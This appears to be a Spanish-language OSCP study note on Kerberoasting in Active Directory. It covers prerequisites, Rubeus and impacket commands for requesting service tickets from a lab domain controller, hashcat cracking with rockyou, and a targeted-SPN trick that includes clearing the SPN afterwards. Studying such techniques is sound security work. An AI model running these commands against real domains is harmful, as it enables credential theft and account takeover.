---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, ad, explotacion, windows, linux]
---

# Kerberoasting

> [!abstract] Qué es y cuándo usarla
> Cualquier usuario autenticado puede pedir el **TGS** de una cuenta con **SPN** (el DC no comprueba permisos al emitirlo). El TGS va cifrado con el **hash de la service account** → se crackea offline para obtener su password. Muy potente si hay service accounts con password débil.

## Requisitos previos
- Credenciales válidas de **cualquier** usuario del dominio.
- Cuentas con SPN registradas (ver [[22 - Active Directory Introduction and Enumeration]], `Get-NetUser -SPN`).

## Pasos
```powershell
# Windows (Rubeus) - como usuario de dominio
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# /tgtdeleg o /ticket fuerzan RC4 en cuentas AES-enabled (más fácil de crackear)
```
```bash
# Linux (impacket) - no hace falta estar en el dominio, solo creds
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Hashcat mode **13100** (Kerberos 5 etype 23, TGS-REP).

> [!tip] **Targeted Kerberoasting**: con `GenericWrite`/`GenericAll` sobre un user, ponle un SPN, roastéalo y **borra el SPN** después.

> [!warning] Detección / problemas
> - Cuentas de **máquina / gMSA / krbtgt**: password aleatorio de 120 chars → **incrackeable**. Apunta a **user accounts**.
> - `impacket` *clock skew* → `ntpdate <dc>` + `faketime`.

## Visto en
- Módulo: [[23 - Attacking Active Directory Authentication]]
- Máquinas: [[]]
